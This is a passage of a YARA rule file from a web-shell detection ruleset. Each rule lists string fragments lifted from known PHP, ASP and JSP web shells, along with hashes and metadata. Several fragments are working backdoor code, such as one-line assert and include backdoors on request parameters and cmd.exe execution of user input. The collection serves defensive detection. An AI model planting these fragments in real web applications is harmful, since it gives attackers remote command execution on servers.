	strings:
		$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
		$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
		$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Winx_Shell
{
	meta:
		description = "Web Shell - file WinX Shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1648-L1662"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		logic_hash = "e6dd5178cafccca751dd3f2e36206acd214a65b2e0783a738a104b3dc680ca21"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
		$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Crystal_Crystal
{
	meta:
		description = "Web Shell - file Crystal.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1663-L1677"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "fdbf54d5bf3264eb1c4bff1fac548879"
		logic_hash = "735332a2ec7df65cca4ca69e702c5893d302a01c7ee7b84d01a1e6ab9646de93"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
		$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_R57_1_4_0
{
	meta:
		description = "Web Shell - file r57.1.4.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1678-L1694"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "574f3303e131242568b0caf3de42f325"
		logic_hash = "cb48621c572d529b8dc634e7b6360257ad4fce9664bfca7ee7c0101be42d2c24"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "@ini_set('error_log',NULL);" fullword
		$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s7 = "@ini_restore(\"disable_functions\");" fullword
		$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Ajn
{
	meta:
		description = "Web Shell - file ajn.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1696-L1710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aaafafc5d286f0bff827a931f6378d04"
		logic_hash = "0a6c9a210c0337d6b984bcf6cd7f14103a0f6f5d38a26c789519c2b1629aaede"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
		$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_List
{
	meta:
		description = "Web Shell - file list.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1727-L1741"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1cfa493a165eb4b43e6d4cc0f2eab575"
		logic_hash = "9c8bdeb5992015b26fbee418ed6e6b7c6b0901f26bddf9dc26706c0b63ea9c95"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
		$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_Co
{
	meta:
		description = "Web Shell - file co.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1742-L1756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "62199f5ac721a0cb9b28f465a513874c"
		logic_hash = "3fab3e97d10b6c56fb7df8bcd520bda318fc127a620c5aafba09cb36ffd6a8df"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
		$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_150
{
	meta:
		description = "Web Shell - file 150.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1757-L1771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "400c4b0bed5c90f048398e1d268ce4dc"
		logic_hash = "139e3d6aa3cd2b6a9731a6cc14c921f9fd82ff7ca79d156f1ff6bc544897fb12"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "HJ3HjqxclkZfp"
		$s1 = "<? eval(gzinflate(base64_decode('" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Cmdjsp_2
{
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1772-L1786"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1b5ae3649f03784e2a5073fa4d160c8b"
		logic_hash = "83be82e260adcff9d3d11344c363f6b5da331339ffe78e561cea9ab09b209030"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_C37
{
	meta:
		description = "Web Shell - file c37.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1787-L1801"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d01144c04e7a46870a8dd823eb2fe5c8"
		logic_hash = "b93394f4e05cc96c31a8adcb0981aa8b069780893c469b41ece3d3ce92c42251"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
		$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_B37
{
	meta:
		description = "Web Shell - file b37.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1802-L1815"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0421445303cfd0ec6bc20b3846e30ff0"
		logic_hash = "ae0cca5723a1e885c26ece5082c24f4c95f0262b8e7baf6db5efde5cfee2cc42"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Backdoor
{
	meta:
		description = "Web Shell - file php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1816-L1830"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		logic_hash = "1f754b4d29eb93316183cf904b375ded7ccdae1d2196fe05950c449ed0d690f4"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
		$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Dabao
{
	meta:
		description = "Web Shell - file dabao.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1831-L1845"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3919b959e3fa7e86d52c2b0a91588d5d"
		logic_hash = "62cf46dc16a7365d196c2cb8ede8b1380a0877d134d3726d7c777096a4eda942"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
		$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_2
{
	meta:
		description = "Web Shell - file 2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1846-L1859"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "267c37c3a285a84f541066fc5b3c1747"
		logic_hash = "bd485c825ae7ac11ff67d109d3c07fb405272a5919e00af39788d1a9c94e754d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Cmdasp
{
	meta:
		description = "Web Shell - file cmdasp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1860-L1874"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "57b51418a799d2d016be546f399c2e9b"
		logic_hash = "4259419b4db8e6a83df6f7d258d41028f7f76b0fd2308eeadb4555066c5a2940"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Spjspshell
{
	meta:
		description = "Web Shell - file spjspshell.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1875-L1888"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d39d51154aaad4ba89947c459a729971"
		logic_hash = "7926eadd3ffb21de73a63e7a28a525037bf88396ea369599b41ac8c0b0d112ad"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Action
{
	meta:
		description = "Web Shell - file action.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1889-L1903"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"
		logic_hash = "5ea7d074d0fe98cf2514a65231013a374532d6b3aa2487bcc34d4285f558752a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
		$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Inderxer
{
	meta:
		description = "Web Shell - file Inderxer.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1904-L1917"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		logic_hash = "915f2f38c1ca1321980ac66ebb95b0c46443e0ba64cc4b2014200db43439c85e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Rader
{
	meta:
		description = "Web Shell - file Rader.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1918-L1932"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		logic_hash = "b578f3e844cbb361f455e55353fad2f0134ede7c3c468cebad9ae265e6e768b8"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
		$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Madnet_Smowu
{
	meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1933-L1951"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3aaa8cad47055ba53190020311b0fb83"
		logic_hash = "5c4f76bdbe535a899e40c890eb1ea65e070c781fe5dd44cf13d4832cfd6d2e13"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "//Authentication" fullword
		$s1 = "$login = \"" fullword
		$s2 = "eval(gzinflate(base64_decode('"
		$s4 = "//Pass"
		$s5 = "$md5_pass = \""
		$s6 = "//If no pass then hash"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Moon
{
	meta:
		description = "Web Shell - file moon.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1952-L1967"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2a2b1b783d3a2fa9a50b1496afa6e356"
		logic_hash = "4e26dbef647caee19a8707a067c228ba96bd986369e4c87c68964ae42c85b09a"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo '<option value=\"create function backshell returns string soname"
		$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
		$s8 = "echo '<option value=\"select cmdshell(\\'net user "

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Minupload
{
	meta:
		description = "Web Shell - file minupload.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1969-L1983"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ec905a1395d176c27f388d202375bdf9"
		logic_hash = "53dea3ea0e2cf83907273fa7f64b21b40e9a5c8e4aa34e5d46d2762396fa89ce"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
		$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_ELMALISEKER_Backd00R
{
	meta:
		description = "Web Shell - file ELMALISEKER Backd00r.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1984-L1998"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "3aa403e0a42badb2c23d4a54ef43e2f4"
		logic_hash = "c5eea930dc386c60e60f052c4945c8d6c0125d3500e60794e21d5ea04f226628"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
		$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_PHP_Bug_1_
{
	meta:
		description = "Web Shell - file bug (1).php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L1999-L2012"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "91c5fae02ab16d51fc5af9354ac2f015"
		logic_hash = "12b957b7e0d0823721273ab71a19ee62d84a8dc5f584a46691f0e0aef996386e"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@include($_GET['bug']);" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Asd
{
	meta:
		description = "Web Shell - file asd.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2027-L2041"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a042c2ca64176410236fcc97484ec599"
		logic_hash = "6620b796b55a67010cd3edebc2ec84c2657717722129ea46288d262cfd1c7e1c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
		$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Metaslsoft
{
	meta:
		description = "Web Shell - file metaslsoft.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2043-L2056"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "aa328ed1476f4a10c0bcc2dde4461789"
		logic_hash = "20d938fbe21bcf04f09c6450a9acd5db556e9c9f83149d3cdd098be7a905d5ca"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Ajan
{
	meta:
		description = "Web Shell - file Ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2057-L2070"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b6f468252407efc2318639da22b08af0"
		logic_hash = "1817786725de61150f1b3ff57597c780323a7f4df1c046cfd473e1918decd7d2"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Config_Myxx_Zend
{
	meta:
		description = "Web Shell - from files config.jsp, myxx.jsp, zend.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L2071-L2087"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "161dc712f279e73ea8cab4b0298cc2ca3799c6d9107050c4231a81021caed37f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		super_rule = 1
		hash0 = "d44df8b1543b837e57cc8f25a0a68d92"
		hash1 = "e0354099bee243702eb11df8d0e046df"
		hash2 = "591ca89a25f06cf01e4345f98a22845c"

	strings:
		$s3 = ".println(\"<a href=\\\"javascript:alert('You Are In File Now ! Can Not Pack !');"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Browser_201_3_Ma_Download
{
	meta:
		description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, download.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
